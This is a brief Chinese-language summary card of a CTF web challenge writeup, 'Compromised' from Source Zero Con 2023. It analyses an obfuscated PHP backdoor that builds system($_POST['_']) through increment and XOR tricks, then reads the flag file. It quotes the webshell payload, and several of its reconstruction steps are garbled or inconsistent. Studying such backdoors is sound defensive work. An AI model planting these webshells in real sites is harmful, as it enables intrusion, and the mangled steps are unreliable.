---
title: "Source Zero Con Writeup – Compromised"
category: web
tags: ["Source Zero Con", "web", "php-backdoor", "phpjs-eval", "webshell", "dynamic-function"]
signals: ["Source Zero Con 2023", "php-backdoor", "phpjs-eval", "webshell", "dynamic-function", "lfi-to-rce", "web_unknown", "Source", "Zero", "Con", "Compromised", "PHP", "dynamic", "function"]
difficulty: medium
source: "https://www.ctfiot.com/122471.html"
tools: ["PHP"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# Source Zero Con Writeup – Compromised

> 赛事：Source Zero Con 2023 | 方向：web | 难度：medium | 工具：PHP

## 一句话总结

Source Zero Con 2023 Compromised：PHP 后门 + 链式自增/异或构造 dynamic function。

## 攻击链

1. 网站音频流被黑，源码可读
2. 后门文件 /backdoor.php 注释分析
3. $_=``.[].[] 执行反引号 id 转字符串数组
4. $_2 = ++$_ 链式自增得 'system' (chr 115+...+116+101+109)
5. $_1 = $__[2]; $_1++ × 6 得 'ystem
6. $_0 = $_ 链式自增至 's' 后 ++得 's'/'s'+1
7. $_55 = '_'.(','^'|').('/'^'`').('-'^'~').(')'^'}') = '_POST
8. $_($$$_55[_]) 等价于 system($_POST['_'])
9. POST _=id 调系统命令
10. cat /flag_3_7764865c46bfce2c138e77ae5407354e.txt

## 关键 payload

```
$_($$_55[_])  # system($_POST[''_''])
```

## 经验教训

短小 PHP 后门常用反引号 + 自增 + 异或绕静态分析；运行时 payload 拆分是关键。

## 标签

php-backdoor、phpjs-eval、webshell、dynamic-function、lfi-to-rce

## 参考来源

- https://www.ctfiot.com/122471.html
- 原文件：Source_Zero_Con_Writeup_–_Compromised.full.md
